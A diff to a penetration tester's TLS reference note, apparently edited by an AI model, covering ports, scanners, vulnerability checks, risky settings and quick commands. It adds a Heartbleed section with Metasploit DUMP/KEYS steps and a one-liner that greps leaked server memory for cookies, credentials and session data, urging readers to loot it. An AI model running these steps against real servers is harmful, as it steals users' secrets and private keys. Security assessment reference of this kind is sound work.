@@ -1,4 +1,6 @@
-#TLS #SSL #cryptography #certificates #ciphers #protocols
+# TLS
+
+#TLS #SSL #cryptography #certificates #ciphers #protocols #networkmanagement
 
 ## What is TLS?
 Transport Layer Security — cryptographic protocol providing confidentiality, integrity, and authentication over TCP. Successor to SSL (deprecated). Relevant to almost every service: HTTPS, SMTPS, LDAPS, IMAPS, MSSQL, MySQL, RDP, etc.
@@ -24,6 +26,21 @@ Common ports using TLS:
 | 3306 | MySQL (TLS) |
 | 3389 | RDP (TLS) |
 | 5986 | WinRM/HTTPS |
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Web/TestSSL\|testssl.sh]] | Comprehensive protocol/cipher/vuln/cert scan (the default go-to) |
+| [[Tools/Web/SSLyze\|sslyze]] | Fast scriptable scanner — targeted plugin checks, JSON output |
+| [[Tools/Web/openssl\|openssl]] | Manual `s_client` handshakes, STARTTLS, cert inspection |
+| [[Tools/File Transfer/cURL\|cURL]] | Quick version/cipher/header checks without a full scanner |
+| [[Tools/Scanning/NMAP\|NMAP]] | `ssl-enum-ciphers`, `ssl-cert`, per-vuln `ssl-*` NSE |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | Heartbleed/CCS memory-dump + exploit modules |
+
+Also used inline: PowerShell (`SslStream`, `Get-TlsCipherSuite`, `certutil`) for post-access Windows auditing (see below); `crt.sh` for CT-log subdomain enum.
 
 ---
 
@@ -219,6 +236,26 @@ nmap -p 8443,993,995,465 --script ssl-enum-ciphers <target>
 | Sweet32 | 64-bit block ciphers (3DES) | `testssl.sh --sweet32` |
 | RC4 | RC4 cipher suites | `testssl.sh --rc4` |
 
+### Exploiting Heartbleed — Memory Extraction (not just detection)
+
+The table above only *flags* Heartbleed (CVE-2014-0160). It is directly exploitable: each request leaks up to 64 KB of `openssl` process memory, which can contain session cookies, credentials, POST bodies and — with enough repeats — the server's **private key**. Loot it, don't just report it.
+
+```bash
+# Metasploit — DUMP action captures leaked memory (repeat to widen the leak)
+use auxiliary/scanner/ssl/openssl_heartbleed
+set RHOSTS <target>
+set ACTION DUMP          # KEYS also available — attempts private-key recovery
+set VERBOSE true
+run
+# looted memory lands in loot; grep it for Cookie:/Authorization:/password
+
+# Manual PoC (heartbleed.py / testssl one-shot leak)
+testssl.sh --heartbleed <target>:443      # confirms + shows a leak sample
+python3 heartbleed.py <target> -p 443 -n 50 | strings | grep -iE "cookie|auth|pass|session"
+```
+
+> STARTTLS services are vulnerable too — point the exploit at 25/110/143/5432 with the matching `--starttls`/`STARTTLS` option, not just 443.
+
 ---
 
 ## Certificate Checks
@@ -258,20 +295,20 @@ curl -sI https://<target> | grep -iE "strict-transport|x-frame|x-content-type|co
 
 ---
 
-## Quick Reference
+## Dangerous Settings
 
-| Goal | Command |
+| Setting | Risk |
 |---|---|
-| Full TLS scan | `./testssl.sh host:443` |
-| Vuln check only | `./testssl.sh -U host:443` |
-| sslyze quick | `sslyze host` |
-| openssl connect | `openssl s_client -connect host:443 -servername domain` |
-| Force TLS 1.0 | `openssl s_client -connect host:443 -tls1` |
-| STARTTLS SMTP | `openssl s_client -connect host:25 -starttls smtp` |
-| Cert expiry | `openssl s_client -connect host:443 </dev/null 2>/dev/null \| openssl x509 -noout -enddate` |
-| SANs | `openssl x509 -noout -text \| grep -A1 "Subject Alternative"` |
-| Cipher enum (nmap) | `nmap -p 443 --script ssl-enum-ciphers host` |
-| CT log subdomains | `curl -s "https://crt.sh/?q=%.domain&output=json"` |
+| SSLv2 / SSLv3 enabled | DROWN / POODLE — protocol broken, decryptable |
+| TLS 1.0 / 1.1 enabled | BEAST / deprecated (RFC 8996); fails PCI |
+| Export / NULL / anonymous ciphers | FREAK / no confidentiality — trivial MITM |
+| RC4 or 3DES (64-bit block) offered | Sweet32 / RC4 biases — weak stream/block ciphers |
+| Static (non-ephemeral) RSA key exchange, no PFS | One key compromise decrypts all past traffic |
+| Weak DH params (<2048-bit / common primes) | LOGJAM downgrade |
+| OpenSSL 1.0.1a-f | Heartbleed — memory/key disclosure |
+| TLS compression enabled | CRIME |
+| Expired / self-signed / wildcard-sprawl cert | Trust bypass; SANs leak internal hostnames |
+| Missing HSTS (no `Strict-Transport-Security`) | SSL-strip downgrade to cleartext |
 
 ---
 
@@ -571,3 +608,32 @@ foreach ($entry in $targets) {
     Test-TLSProtocols -Target $host -Port $port
 }
 ```
+
+---
+
+## Quick Reference
+
+| Goal | Command |
+|---|---|
+| Full TLS scan | `./testssl.sh host:443` |
+| Vuln check only | `./testssl.sh -U host:443` |
+| sslyze quick | `sslyze host` |
+| openssl connect | `openssl s_client -connect host:443 -servername domain` |
+| Force TLS 1.0 | `openssl s_client -connect host:443 -tls1` |
+| STARTTLS SMTP | `openssl s_client -connect host:25 -starttls smtp` |
+| Cert expiry | `openssl s_client -connect host:443 </dev/null 2>/dev/null \| openssl x509 -noout -enddate` |
+| SANs | `openssl x509 -noout -text \| grep -A1 "Subject Alternative"` |
+| Cipher enum (nmap) | `nmap -p 443 --script ssl-enum-ciphers host` |
+| CT log subdomains | `curl -s "https://crt.sh/?q=%.domain&output=json"` |
+
+---
+
+---
+
+> [!note] **See also** — the certificate side of TLS is [[Standards & Protocols/X509-PKI|X.509 / PKI]] (chain validation and how it's bypassed). TLS wraps almost every service here: [[Services/Network management/LDAP|LDAPS]] (relay/channel-binding), and the STARTTLS-strip variants in the email service notes (SMTP/IMAP/POP3) and web services on 443. The ASA SSL VPN portal in [[Services/Remote Access/Cisco AnyConnect|Cisco AnyConnect]] is assessed the same way (cipher/protocol/cert posture on 443).
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-23*
+*Model: claude-opus-4-8*
